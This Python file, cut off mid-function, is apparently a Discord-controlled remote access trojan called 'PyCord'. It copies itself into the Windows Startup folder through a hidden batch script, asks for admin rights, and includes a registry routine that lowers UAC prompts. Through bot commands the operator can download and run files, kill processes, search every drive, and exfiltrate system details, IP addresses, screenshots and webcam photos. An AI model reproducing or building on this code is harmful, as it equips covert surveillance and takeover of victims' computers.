import discord
from discord.ext import commands
import uuid
import socket
import re
import platform
import getpass
import psutil
import datetime
import os
import subprocess
import asyncio
import urllib.request
import urllib.parse
import aiohttp
import concurrent.futures
import threading
import shutil
import zipfile
import io
import sys
import ctypes
import tempfile
import winreg
import time

def is_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def get_startup_dir() -> str:
    """Path to the shell:startup folder of the current user."""
    return os.path.join(
        os.environ.get("APPDATA", ""),
        "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
    )


def relaunch_as_admin(exe_path: str):
    """Relaunches the specified EXE with admin rights (UAC)."""
    try:
        params = " ".join(f'"{a}"' for a in sys.argv[1:])
        ret = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", exe_path, params.strip(), None, 1
        )
        if ret <= 32:
            print("❌ Admin rights were denied.")
            sys.exit(1)
    except Exception as e:
        print(f"❌ Error during admin relaunch: {e}")
        sys.exit(1)
    sys.exit(0)


def move_to_startup_and_restart():
    """
    Creates a batch file that:
      1. waits until the current EXE has exited,
      2. moves the EXE into the autostart folder,
      3. starts the moved EXE with admin rights.
    The current process then exits.
    """
    current_exe = os.path.abspath(sys.executable)
    startup_dir = get_startup_dir()
    target_exe = os.path.join(startup_dir, os.path.basename(current_exe))
    current_pid = os.getpid()

    # Write batch script to TEMP
    bat_path = os.path.join(tempfile.gettempdir(), f"pycord_move_{current_pid}.bat")

    bat_content = f"""@echo off
title PyCord Autostart Setup
echo Waiting for PyCord to exit...

:waitloop
tasklist /FI "PID eq {current_pid}" 2>NUL | find "{current_pid}" >NUL
if not errorlevel 1 (
    timeout /t 1 /nobreak >NUL
    goto waitloop
)

echo Moving EXE to the autostart folder...
move /Y "{current_exe}" "{target_exe}" >NUL

echo Restarting PyCord with admin rights...
powershell -Command "Start-Process -FilePath '{target_exe}' -Verb RunAs"

echo Cleaning up...
del "%~f0"
"""

    with open(bat_path, "w", encoding="utf-8") as f:
        f.write(bat_content)

    # Start batch invisibly
    subprocess.Popen(
        ["cmd", "/c", bat_path],
        creationflags=subprocess.CREATE_NO_WINDOW,
        shell=False
    )

    print("📦 EXE will be moved to the autostart folder and restarted ...")
    time.sleep(1)
    sys.exit(0)


# --- Startup logic ---
if getattr(sys, "frozen", False):
    # We are running as an EXE
    current_exe = os.path.abspath(sys.executable)
    startup_dir = get_startup_dir()
    target_exe = os.path.join(startup_dir, os.path.basename(current_exe))

    # 1) Is the EXE already in the autostart folder?
    if os.path.normcase(current_exe) != os.path.normcase(target_exe):
        # No → move + admin restart
        move_to_startup_and_restart()
    else:
        # Yes → only check admin
        if not is_admin():
            print("🔒 No admin rights – requesting UAC ...")
            relaunch_as_admin(current_exe)
        print("✅ Admin rights confirmed. EXE is running from the autostart folder.")
else:
    # Normal Python script → only check admin
    if not is_admin():
        print("🔒 No admin rights – requesting UAC ...")
        try:
            script = os.path.abspath(sys.argv[0])
            params = f'"{script}" ' + " ".join(f'"{a}"' for a in sys.argv[1:])
            ret = ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, params.strip(), None, 1
            )
            if ret <= 32:
                print("❌ Admin rights were denied.")
                sys.exit(1)
        except Exception as e:
            print(f"❌ Error during admin relaunch: {e}")
            sys.exit(1)
        sys.exit(0)
    print("✅ Admin rights confirmed.")


def set_uac_low():
    """
    Sets the UAC level to 'Never notify' (lowest),
    WITHOUT completely disabling UAC (EnableLUA stays 1).
    Requires administrator rights!
    """
    try:
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            key_path,
            0,
            winreg.KEY_SET_VALUE
        ) as key:
            # Elevate admin without prompting
            winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
            # UAC prompt on normal desktop (not secure desktop)
            winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 0)
            # EnableLUA stays 1 → UAC is active, but in "Never notify" mode
            # (Optionally set explicitly to 1 in case it was 0 before)
            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 1)

        print("✅ UAC set to 'Never notify' (restart required).")
    except PermissionError:
        print("❌ No administrator rights! Run the EXE as admin.")
    except Exception as e:
        print(f"❌ Error while setting UAC values: {e}")


def restore_uac_default():
    """Restores the Windows default values (recommended after testing)."""
    try:
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            key_path,
            0,
            winreg.KEY_SET_VALUE
        ) as key:
            winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 5)
            winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 1)

        print("✅ UAC default values restored (restart required).")
    except Exception as e:
        print(f"❌ Error while restoring: {e}")


# --- Read Data.txt (works as script AND as PyInstaller EXE, without temp file) ---
def load_data(file_path="Data.txt"):
    """
    Reads Data.txt.
    - In normal script mode: from the file system.
    - In the PyInstaller EXE: directly from the embedded archive (sys._MEIPASS) → stays in RAM.
    """
    data = {}

    # Determine path
    if getattr(sys, "frozen", False):
        # PyInstaller EXE: file is in the extracted _MEIPASS folder
        base_path = getattr(sys, "_MEIPASS", os.path.dirname(sys.executable))
        full_path = os.path.join(base_path, file_path)
    else:
        full_path = file_path

    # Read file (from RAM archive if EXE)
    with open(full_path, "r", encoding="utf-8") as f:
        content = f.read()

    # Put into an in-memory stream and parse line by line
    for line in io.StringIO(content):
        line = line.strip()
        if not line or "=" not in line:
            continue
        key, value = line.split("=", 1)
        data[key.strip()] = value.strip()

    return data


# --- Get MAC address ---
def get_mac_address():
    mac = uuid.getnode()
    return ":".join(re.findall("..", f"{mac:012x}")).upper()


# --- Load data ---
data = load_data("Data.txt")
TOKEN = data.get("Token")
GUILD_ID = data.get("Server")

if not TOKEN:
    raise ValueError("No token found in Data.txt!")
if not GUILD_ID:
    raise ValueError("No server ID found in Data.txt!")

GUILD_ID = int(GUILD_ID)
MAC_ADDRESS = get_mac_address()
MY_CATEGORY_NAME = f"pc-{MAC_ADDRESS.replace(':', '-').lower()}"
START_TIME = datetime.datetime.now()

print(f"🖥️ Own MAC: {MAC_ADDRESS}")
print(f"📁 Own category: {MY_CATEGORY_NAME}")


# --- Bot Setup ---
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)


# --- Helper ---
def bytes_to_human(n):
    for unit in ["B", "KB", "MB", "GB", "TB"]:
        if n < 1024:
            return f"{n:.2f} {unit}"
        n /= 1024
    return f"{n:.2f} PB"


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "Unknown"


def get_public_ip():
    try:
        return urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
    except Exception:
        return "Not available"


# --- Upload folder path ---
def get_upload_dir():
    """Returns the path to %LocalAppData%\\PyCord\\Up-loads and creates it."""
    local_appdata = os.environ.get("LOCALAPPDATA") or os.path.expanduser("~\\AppData\\Local")
    pycord_dir = os.path.join(local_appdata, "PyCord")
    upload_dir = os.path.join(pycord_dir, "Up-loads")

    os.makedirs(pycord_dir, exist_ok=True)
    os.makedirs(upload_dir, exist_ok=True)

    return upload_dir


def extract_urls(text: str):
    """Finds all http/https URLs in a text."""
    pattern = r"https?://[^\s<>\"']+"
    return re.findall(pattern, text)


def filename_from_url(url: str):
    """Determines a filename from a URL."""
    parsed = urllib.parse.urlparse(url)
    name = os.path.basename(parsed.path)
    if not name or "." not in name:
        name = "download"
    return name


async def download_file(session: aiohttp.ClientSession, url: str, save_path: str):
    """Downloads a file asynchronously."""
    async with session.get(url) as resp:
        if resp.status != 200:
            raise Exception(f"HTTP {resp.status}")
        with open(save_path, "wb") as f:
            async for chunk in resp.content.iter_chunked(65536):
                f.write(chunk)


# ============================================================
#  GLOBAL CHECK
# ============================================================
@bot.check
async def global_check(ctx: commands.Context):
    if ctx.author.bot:
        return False

    # Only on our server
    if ctx.guild is None or ctx.guild.id != GUILD_ID:
        return False

    # Get channel category (robust)
    category = ctx.channel.category
    if category is None:
        # Work around cache issues: fetch fresh from server
        try:
            channel = await bot.fetch_channel(ctx.channel.id)
            category = channel.category
        except Exception:
            return False

    category_name = category.name if category else None

    # Not our category → silently ignore
    if category_name != MY_CATEGORY_NAME:
        return False

    # Only in 🤖commands channel
    if ctx.channel.name != "🤖commands":
        try:
            await ctx.message.delete()
            hint = await ctx.send(f"{ctx.author.mention} use the 🤖commands channel!")
            await hint.delete(delay=5)
        except (discord.Forbidden, discord.NotFound):
            pass
        return False

    return True


# ============================================================
#  UPLOAD LISTENER
# ============================================================
@bot.event
async def on_message(message: discord.Message):
    # Ignore bots
    if message.author.bot:
        return

    # Only on our server
    if message.guild is None or message.guild.id != GUILD_ID:
        await bot.process_commands(message)
        return

    # Check category
    category = message.channel.category
    if category is None or category.name != MY_CATEGORY_NAME:
        await bot.process_commands(message)
        return

    # Only in ⬆️up-load channel
    if message.channel.name == "⬆️up-load":
        urls = extract_urls(message.content)

        if not urls:
            try:
                await message.delete()
                hint = await message.channel.send(
                    f"{message.author.mention} send a valid link (http/https)!"
                )
                await hint.delete(delay=5)
            except (discord.Forbidden, discord.NotFound):
                pass
            return

        upload_dir = get_upload_dir()
        results = []

        async with aiohttp.ClientSession() as session:
            for url in urls:
                filename = filename_from_url(url)
                save_path = os.path.join(upload_dir, filename)

                # Collision: append number
                base, ext = os.path.splitext(filename)
                counter = 1
                while os.path.exists(save_path):
                    save_path = os.path.join(upload_dir, f"{base}_{counter}{ext}")
                    counter += 1

                try:
                    await download_file(session, url, save_path)
                    size = os.path.getsize(save_path)
                    results.append(f"✅ `{os.path.basename(save_path)}` ({bytes_to_human(size)})")
                except Exception as e:
                    results.append(f"❌ `{filename}` – Error: {e}")

        embed = discord.Embed(
            title="📥 Download complete",
            description="\n".join(results),
            color=0x2ecc71
        )
        embed.add_field(name="📁 Save location", value=f"`{upload_dir}`", inline=False)
        embed.set_footer(text=f"Requested by {message.author}")

        try:
            await message.delete()
        except (discord.Forbidden, discord.NotFound):
            pass

        await message.channel.send(embed=embed)
        return

    # Process everything else normally (commands)
    await bot.process_commands(message)


@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user} (ID: {bot.user.id})")

    await bot.change_presence(
        status=discord.Status.online,
        activity=discord.Game(name="with Python 🐍")
    )

    guild = bot.get_guild(GUILD_ID)
    if not guild:
        print(f"⚠️ Server with ID {GUILD_ID} not found!")
        return

    print(f"🌐 Connected to server: {guild.name}")

    existing_category = discord.utils.get(guild.categories, name=MY_CATEGORY_NAME)

    if existing_category is None:
        print(f"📁 Creating category '{MY_CATEGORY_NAME}'...")
        try:
            category = await guild.create_category(name=MY_CATEGORY_NAME)
            await guild.create_text_channel(name="🤖commands", category=category)
            await guild.create_text_channel(name="⬆️up-load", category=category)
            await guild.create_text_channel(name="⬇️down-load", category=category)
            info_channel = await guild.create_text_channel(
                name="‼️information", category=category
            )


            await info_channel.send(f"🟢 **PC is now Online!**\nMAC: `{MAC_ADDRESS}`")
            print("✅ Category created.")
            await asyncio.sleep(2)
        except discord.Forbidden:
            print("❌ No permission!")
        except Exception as e:
            print(f"❌ Error: {e}")
    else:
        print(f"📁 Category '{MY_CATEGORY_NAME}' already exists.")
        info_channel = discord.utils.get(
            existing_category.text_channels, name="‼️information"
        )
        if info_channel:
            await info_channel.send("🟢 **PC is now Online!**")
        else:
            info_channel = await guild.create_text_channel(
                name="‼️information", category=existing_category
            )
            await info_channel.send("🟢 **PC is now Online!**")

# ============================================================
#  COMMANDS
# ============================================================

@bot.command(name="ping")
async def ping(ctx):
    await ctx.send(f"🏓 Pong! Latency: {round(bot.latency * 1000)}ms")


@bot.command(name="uptime")
async def uptime(ctx):
    delta = datetime.datetime.now() - START_TIME
    hours, rem = divmod(int(delta.total_seconds()), 3600)
    minutes, seconds = divmod(rem, 60)

    boot_time = datetime.datetime.fromtimestamp(psutil.boot_time())
    pc_delta = datetime.datetime.now() - boot_time
    pc_hours, pc_rem = divmod(int(pc_delta.total_seconds()), 3600)
    pc_minutes, pc_seconds = divmod(pc_rem, 60)

    embed = discord.Embed(title="⏱️ Uptime", color=0x00ff00)
    embed.add_field(name="🤖 Bot", value=f"{hours}h {minutes}m {seconds}s", inline=False)
    embed.add_field(
        name="🖥️ PC",
        value=f"{pc_hours}h {pc_minutes}m {pc_seconds}s\n"
              f"Started: {boot_time.strftime('%Y-%m-%d %H:%M:%S')}",
        inline=False
    )
    await ctx.send(embed=embed)


@bot.command(name="diskinfo")
async def diskinfo(ctx):
    embed = discord.Embed(title="💾 Disk Info", color=0x3498db)
    for part in psutil.disk_partitions(all=False):
        try:
            usage = psutil.disk_usage(part.mountpoint)
            embed.add_field(
                name=f"📀 {part.device} ({part.fstype})",
                value=(
                    f"**Total:** {bytes_to_human(usage.total)}\n"
                    f"**Used:** {bytes_to_human(usage.used)} ({usage.percent}%)\n"
                    f"**Free:** {bytes_to_human(usage.free)}"
                ),
                inline=False
            )
        except PermissionError:
            continue
    await ctx.send(embed=embed)


@bot.command(name="ipinfo")
async def ipinfo(ctx):
    embed = discord.Embed(title="🌐 IP Info", color=0x9b59b6)
    embed.add_field(name="Local IP", value=f"`{get_local_ip()}`", inline=False)
    embed.add_field(name="Public IP", value=f"`{get_public_ip()}`", inline=False)
    embed.add_field(name="Hostname", value=f"`{socket.gethostname()}`", inline=False)
    await ctx.send(embed=embed)


@bot.command(name="userinfo")
async def userinfo(ctx):
    embed = discord.Embed(title="👤 User Info", color=0xe67e22)
    embed.add_field(name="User", value=f"`{getpass.getuser()}`", inline=True)
    embed.add_field(name="Hostname", value=f"`{socket.gethostname()}`", inline=True)
    embed.add_field(name="Operating System", value=f"`{platform.system()} {platform.release()}`", inline=False)
    embed.add_field(name="Version", value=f"`{platform.version()}`", inline=False)
    embed.add_field(name="Architecture", value=f"`{platform.machine()}`", inline=True)
    embed.add_field(name="Processor", value=f"`{platform.processor()}`", inline=True)
    await ctx.send(embed=embed)


@bot.command(name="pcdata")
async def pcdata(ctx):
    cpu_percent = psutil.cpu_percent(interval=1)
    cpu_count = psutil.cpu_count(logical=True)
    cpu_freq = psutil.cpu_freq()
    ram = psutil.virtual_memory()

    try:
        disk = psutil.disk_usage(os.path.abspath(os.sep))
    except Exception:
        disk = None

    net = psutil.net_io_counters()

    boot_time = datetime.datetime.fromtimestamp(psutil.boot_time())
    pc_delta = datetime.datetime.now() - boot_time
    pc_hours, pc_rem = divmod(int(pc_delta.total_seconds()), 3600)
    pc_minutes, _ = divmod(pc_rem, 60)

    embed = discord.Embed(
        title="🖥️ PC Data Overview",
        color=0x1abc9c,
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="🆔 MAC Address", value=f"`{MAC_ADDRESS}`", inline=False)
    embed.add_field(name="👤 User", value=f"`{getpass.getuser()}`", inline=True)
    embed.add_field(name="🖥️ Hostname", value=f"`{socket.gethostname()}`", inline=True)
    embed.add_field(name="💻 OS", value=f"`{platform.system()} {platform.release()}`", inline=False)

    cpu_value = f"Usage: **{cpu_percent}%**\nCores: **{cpu_count}**"
    if cpu_freq:
        cpu_value += f"\nFrequency: **{cpu_freq.current:.0f} MHz**"
    embed.add_field(name="⚙️ CPU", value=cpu_value, inline=False)

    embed.add_field(
        name="🧠 RAM",
        value=f"Total: **{bytes_to_human(ram.total)}**\n"
              f"Used: **{bytes_to_human(ram.used)}** ({ram.percent}%)\n"
              f"Free: **{bytes_to_human(ram.available)}**",
        inline=False
    )

    if disk:
        embed.add_field(
            name="💾 Disk (System)",
            value=f"Total: **{bytes_to_human(disk.total)}**\n"
                  f"Used: **{bytes_to_human(disk.used)}** ({disk.percent}%)\n"
                  f"Free: **{bytes_to_human(disk.free)}**",
            inline=False
        )

    embed.add_field(
        name="🌐 Network",
        value=f"Sent: **{bytes_to_human(net.bytes_sent)}**\n"
              f"Received: **{bytes_to_human(net.bytes_recv)}**",
        inline=False
    )

    embed.add_field(
        name="⏱️ Uptime",
        value=f"**{pc_hours}h {pc_minutes}m** (since {boot_time.strftime('%Y-%m-%d %H:%M')})",
        inline=False
    )

    embed.add_field(name="🌍 Local IP", value=f"`{get_local_ip()}`", inline=True)
    embed.add_field(name="🌍 Public IP", value=f"`{get_public_ip()}`", inline=True)

    embed.set_footer(text=f"Requested by {ctx.author}")
    await ctx.send(embed=embed)

import concurrent.futures
import threading

# ============================================================
#  !searchpath – Multithreaded search across all drives
# ============================================================
SEARCH_MAX_RESULTS = 200          # Total limit
SEARCH_MAX_WORKERS = 8            # Number of parallel threads (per drive)


def _get_drive_roots():
    """Returns all available drives / mount points."""
    roots = []
    if platform.system() == "Windows":
        for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
            drive = f"{letter}:\\"
            if os.path.exists(drive):
                roots.append(drive)
    else:
        roots.append("/")
    return roots


def _scan_root(root, filename_lower, stop_event, results, lock, counter):
    """Recursively scans ONE drive for matching files."""
    try:
        for dirpath, dirnames, filenames in os.walk(
            root, followlinks=False, onerror=lambda e: None
        ):
            if stop_event.is_set():
                return

            # Skip system/problem folders
            dirnames[:] = [
                d for d in dirnames
                if not d.startswith("$")
                and d.lower() not in (
                    "system volume information",
                    "recovery",
                    "windows.old",
                )
            ]

            counter[0] += 1

            for f in filenames:
                if f.lower().endswith(filename_lower) or f.lower() == filename_lower:
                    with lock:
                        results.append(os.path.join(dirpath, f))
                        if len(results) >= SEARCH_MAX_RESULTS:
                            stop_event.set()
                            return
    except Exception:
        pass


@bot.command(name="searchpath")
async def searchpath(ctx, *, filename: str = None):
    """Searches ALL drives in parallel (multithreaded) for files."""
    if not filename:
        await ctx.send("❌ Usage: `!searchpath <filename>`")
        return

    filename_lower = filename.lower()
    roots = _get_drive_roots()

    if not roots:
        await ctx.send("❌ No drives found.")
        return

    msg = await ctx.send(
        f"🔍 Searching `{filename}` on **{len(roots)} drive(s)** "
        f"with **{SEARCH_MAX_WORKERS} threads** ..."
    )

    results = []
    lock = threading.Lock()
    stop_event = threading.Event()
    counter = [0]  # folders scanned

    # --- Start search in background ---
    def run_search():
        with concurrent.futures.ThreadPoolExecutor(max_workers=SEARCH_MAX_WORKERS) as executor:
            futures = [
                executor.submit(
                    _scan_root, root, filename_lower,
                    stop_event, results, lock, counter
                )
                for root in roots
            ]
            concurrent.futures.wait(futures)

    search_task = asyncio.create_task(asyncio.to_thread(run_search))

    # --- Progress display every 3s ---
    while not search_task.done():
        try:
            await asyncio.wait_for(asyncio.shield(search_task), timeout=3)
            break
        except asyncio.TimeoutError:
            try:
                await msg.edit(
                    content=(
                        f"🔍 Searching `{filename}` ...\n"
                        f"📂 {counter[0]} folders scanned | "
                        f"✅ {len(results)} matches"
                    )
                )
            except discord.NotFound:
                break

    try:
        await search_task
    except Exception as e:
        await msg.edit(content=f"❌ Search error: `{e}`")
        return

    # --- Output ---
    if not results:
        await msg.edit(content=f"❌ No file found ending with `{filename}`.")
        return

    header = f"🔍 **{len(results)} matches** for `{filename}`"
    if len(results) >= SEARCH_MAX_RESULTS:
        header += f" (limit {SEARCH_MAX_RESULTS} reached)"
    header += f"\n📂 {counter[0]} folders scanned\n"

    chunks = []
    current = header
    for path in results:
        line = f"`{path}`\n"
        if len(current) + len(line) > 1900:
            chunks.append(current)
            current = ""
        current += line
    if current:
        chunks.append(current)

    await msg.edit(content=chunks[0])
    for chunk in chunks[1:]:
        await ctx.send(chunk)


# Allowed file extensions for !run (security)
ALLOWED_EXTENSIONS = {
    ".exe", ".bat", ".cmd", ".ps1", ".py", ".msi",
    ".lnk", ".vbs", ".jar"
}

@bot.command(name="run")
async def run_file(ctx, *, path: str = None):
    """Executes a file on the PC."""
    if not path:
        await ctx.send("❌ Usage: `!run <path>`")
        return

    # Remove quotes
    path = path.strip().strip('"').strip("'")

    # Check if file exists
    if not os.path.isfile(path):
        await ctx.send(f"❌ File not found: `{path}`")
        return

    # Check extension
    ext = os.path.splitext(path)[1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        await ctx.send(
            f"❌ File type `{ext}` is not allowed.\n"
            f"Allowed: {', '.join(sorted(ALLOWED_EXTENSIONS))}"
        )
        return

    try:
        # On Windows: open with default program
        if platform.system() == "Windows":
            os.startfile(path)  # type: ignore[attr-defined]
        elif platform.system() == "Darwin":
            subprocess.Popen(["open", path])
        else:
            subprocess.Popen(["xdg-open", path])

        embed = discord.Embed(
            title="▶️ File executed",
            description=f"`{path}`",
            color=0x2ecc71
        )
        embed.set_footer(text=f"Executed by {ctx.author}")
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(f"❌ Error while executing:\n```{e}```")

# ============================================================
#  !processinfo – Show all running processes
# ============================================================
@bot.command(name="processinfo", aliases=["prozessinfo", "procinfo", "ps"])
async def processinfo(ctx, *, filter_name: str = None):
    """
    Shows all running processes.
    Optional: !processinfo <name> filters by name.
    """
    await ctx.typing()

    def collect():
        procs = []
        for p in psutil.process_iter(
            ["pid", "name", "username", "cpu_percent", "memory_percent", "status", "create_time"]
        ):
            try:
                info = p.info
                if filter_name and filter_name.lower() not in (info["name"] or "").lower():
                    continue
                procs.append(info)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        # Sort by memory usage (descending)
        procs.sort(key=lambda x: x.get("memory_percent") or 0, reverse=True)
        return procs

    procs = await asyncio.to_thread(collect)

    if not procs:
        await ctx.send("❌ No processes found.")
        return

    total = len(procs)
    display = procs[:30]  # only show top 30

    lines = []
    for p in display:
        try:
            mem = f"{p['memory_percent']:.1f}%" if p.get("memory_percent") is not None else "?"
            cpu = f"{p['cpu_percent']:.0f}%" if p.get("cpu_percent") is not None else "?"
            name = (p["name"] or "?")[:25]
            lines.append(f"`{p['pid']:>6}` | {name:<25} | RAM {mem:>5} | CPU {cpu:>4}")
        except Exception:
            continue

    header = f"⚙️ **{total} processes**"
    if filter_name:
        header += f" (filter: `{filter_name}`)"
    if total > len(display):
        header += f" – showing top {len(display)} by RAM"
    header += "\n```\n" + "PID    | NAME                      | RAM   | CPU\n"
    header += "-------|---------------------------|-------|-----\n"
    header += "\n".join(lines) + "\n```"

    # Split into chunks (Discord 2000 character limit)
    if len(header) > 1950:
        chunks = []
        current = ""
        for line in header.split("\n"):
            if len(current) + len(line) + 1 > 1950:
                chunks.append(current)
                current = ""
            current += line + "\n"
        if current:
            chunks.append(current)
        for c in chunks:
            await ctx.send(c)
    else:
        await ctx.send(header)


# ============================================================
#  !kill – Terminate process by PID
# ============================================================
# These processes must NEVER be terminated (system protection)
PROTECTED_NAMES = {
    "system", "system idle process", "registry", "smss.exe",
    "csrss.exe", "wininit.exe", "winlogon.exe", "services.exe",
    "lsass.exe", "svchost.exe", "explorer.exe", "dwm.exe",
    "python.exe", "pythonw.exe",  # protect the bot itself
    "pycord.exe",
}


@bot.command(name="kill", aliases=["killproc", "killprocess"])
async def kill_process(ctx, *, pid_or_name: str = None):
    """
    Terminates a process by PID or name.
    Usage: !kill 1234   or   !kill notepad.exe
    """
    if not pid_or_name:
        await ctx.send("❌ Usage: `!kill <PID>` or `!kill <process name>`")
        return

    pid_or_name = pid_or_name.strip()

    # --- By PID ---
    if pid_or_name.isdigit():
        pid = int(pid_or_name)
        try:
            proc = psutil.Process(pid)
        except psutil.NoSuchProcess:
            await ctx.send(f"❌ No process with PID `{pid}` found.")
            return

        try:
            name = proc.name()
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            name = "?"

        # Protection check
        if name.lower() in PROTECTED_NAMES:
            await ctx.send(f"🛡️ Process `{name}` (PID {pid}) is protected and will not be terminated.")
            return

        try:
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except psutil.TimeoutExpired:
                proc.kill()
            await ctx.send(f"✅ Process `{name}` (PID {pid}) has been terminated.")
        except psutil.AccessDenied:
            await ctx.send(f"❌ Access denied for PID `{pid}`. Run bot as admin!")
        except Exception as e:
            await ctx.send(f"❌ Error terminating PID `{pid}`:\n```{e}```")
        return

    # --- By name ---
    name_query = pid_or_name.lower()
    killed = []
    failed = []
    protected = []

    for p in psutil.process_iter(["pid", "name"]):
        try:
            pname = (p.info["name"] or "").lower()
            if pname == name_query or pname == name_query + ".exe" or pname.startswith(name_query):
                if pname in PROTECTED_NAMES:
                    protected.append(f"`{p.info['name']}` (PID {p.info['pid']})")
                    continue
                try:
                    p.terminate()
                    try:
                        p.wait(timeout=3)
                    except psutil.TimeoutExpired:
                        p.kill()
                    killed.append(f"`{p.info['name']}` (PID {p.info['pid']})")
                except psutil.AccessDenied:
                    failed.append(f"`{p.info['name']}` (PID {p.info['pid']}) – access denied")
                except Exception as e:
                    failed.append(f"`{p.info['name']}` (PID {p.info['pid']}) – {e}")
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

    embed = discord.Embed(title=f"🔪 Kill: `{pid_or_name}`", color=0xe74c3c)

    if killed:
        embed.add_field(name=f"✅ Terminated ({len(killed)})", value="\n".join(killed[:10]), inline=False)
    if protected:
        embed.add_field(name=f"🛡️ Protected ({len(protected)})", value="\n".join(protected[:10]), inline=False)
    if failed:
        embed.add_field(name=f"❌ Failed ({len(failed)})", value="\n".join(failed[:10]), inline=False)

    if not killed and not protected and not failed:
        embed.description = "No matching processes found."

    await ctx.send(embed=embed)

# ============================================================
#  !screenshot – Screenshots from all monitors
# ============================================================
@bot.command(name="screenshot", aliases=["screen", "ss"])
async def screenshot(ctx):
    """Takes a screenshot from each monitor and sends them to ⬇️down-load."""
    try:
        import mss
        import mss.tools
    except ImportError:
        await ctx.send("❌ `mss` is not installed. Run: `pip install mss`")
        return

    # Find down-load channel in own category
    guild = bot.get_guild(GUILD_ID)
    if guild is None:
        await ctx.send("❌ Server not found.")
        return

    category = discord.utils.get(guild.categories, name=MY_CATEGORY_NAME)
    if category is None:
        await ctx.send("❌ Own category not found.")
        return

    download_channel = discord.utils.get(
        category.text_channels, name="⬇️down-load"
    )
    if download_channel is None:
        await ctx.send("❌ Channel `⬇️down-load` not found.")
        return

    msg = await ctx.send("📸 Creating screenshots ...")

    # Create screenshots in thread (mss blocks)
    def capture_all():
        shots = []
        tmp_dir = os.path.join(
            os.environ.get("LOCALAPPDATA", os.path.expanduser("~")),
            "PyCord",
            "Screenshots"
        )
        os.makedirs(tmp_dir, exist_ok=True)

        with mss.mss() as sct:
            monitors = sct.monitors  # [0] = virtual full screen, [1..] = monitors
            for i, monitor in enumerate(monitors[1:], start=1):
                try:
                    img = sct.grab(monitor)
                    filename = (
                        f"screenshot_monitor{i}_"
                        f"{datetime.datetime.now():%Y%m%d_%H%M%S}.png"
                    )
                    path = os.path.join(tmp_dir, filename)
                    mss.tools.to_png(img.rgb, img.size, output=path)
                    shots.append((i, path, monitor["width"], monitor["height"]))
                except Exception as e:
                    print(f"⚠️ Monitor {i} error: {e}")
                    shots.append((i, None, 0, 0))
        return shots

    try:
        shots = await asyncio.to_thread(capture_all)
    except Exception as e:
        await msg.edit(content=f"❌ Error while creating: `{e}`")
        return

    if not shots:
        await msg.edit(content="❌ No monitors found.")
        return

    # Upload screenshots
    uploaded = []
    failed = []

    for i, path, w, h in shots:
        if path is None or not os.path.isfile(path):
            failed.append(f"Monitor {i}")
            continue
        try:
            file = discord.File(path, filename=os.path.basename(path))
            embed = discord.Embed(
                title=f"📸 Monitor {i}",
                description=f"Resolution: **{w}×{h}**",
                color=0x3498db,
                timestamp=datetime.datetime.now()
            )
            embed.set_image(url=f"attachment://{os.path.basename(path)}")
            embed.set_footer(text=f"Executed by {ctx.author}")
            await download_channel.send(embed=embed, file=file)
            uploaded.append(f"Monitor {i}")
        except discord.Forbidden:
            failed.append(f"Monitor {i} (no permission)")
        except Exception as e:
            failed.append(f"Monitor {i} ({e})")

    # Summary
    if not uploaded:
        await msg.edit(content="❌ No screenshots could be uploaded.")
        return

    summary = f"✅ {len(uploaded)} screenshot(s) sent to {download_channel.mention}."
    if failed:
        summary += f"\n⚠️ Failed: {', '.join(failed)}"

    await msg.edit(content=summary)

# ============================================================
#  !webcam – Photos from all detected webcams
# ============================================================
@bot.command(name="webcam", aliases=["cam", "wc"])
async def webcam(ctx):
    """Takes a photo from each detected webcam and sends them to ⬇️down-load."""
    try:
        import cv2
    except ImportError:
        await ctx.send("❌ `opencv-python` is not installed. Run: `pip install opencv-python`")
        return

    guild = bot.get_guild(GUILD_ID)
    if guild is None:
        await ctx.send("❌ Server not found.")
        return

    category = discord.utils.get(guild.categories, name=MY_CATEGORY_NAME)
    if category is None:
        await ctx.send("❌ Own category not found.")
        return

    download_channel = discord.utils.get(
        category.text_channels, name="⬇️down-load"
    )
    if download_channel is None:
        await ctx.send("❌ Channel `⬇️down-load` not found.")
        return

    msg = await ctx.send("📷 Searching for webcams and taking photos ...")

    def capture_all():
        shots = []
        tmp_dir = os.path.join(
            os.environ.get("LOCALAPPDATA", os.path.expanduser("~")),
            "PyCord",
            "Webcam"
        )
        os.makedirs(tmp_dir, exist_ok=True)

        # Try the first 10 camera indices
        for index in range(10):
            cap = None
            try:
                # On Windows use DirectShow backend (more reliable)
                if platform.system() == "Windows":
                    cap = cv2.VideoCapture(index, cv2.CAP_DSHOW)
                else:
                    cap = cv2.VideoCapture(index)
                
                if not cap.isOpened():
                    if cap is not None:
                        cap.release()
                    continue

                # Discard a few frames (auto-exposure/lighting)
                for _ in range(5):
                    cap.read()

                ret, frame = cap.read()
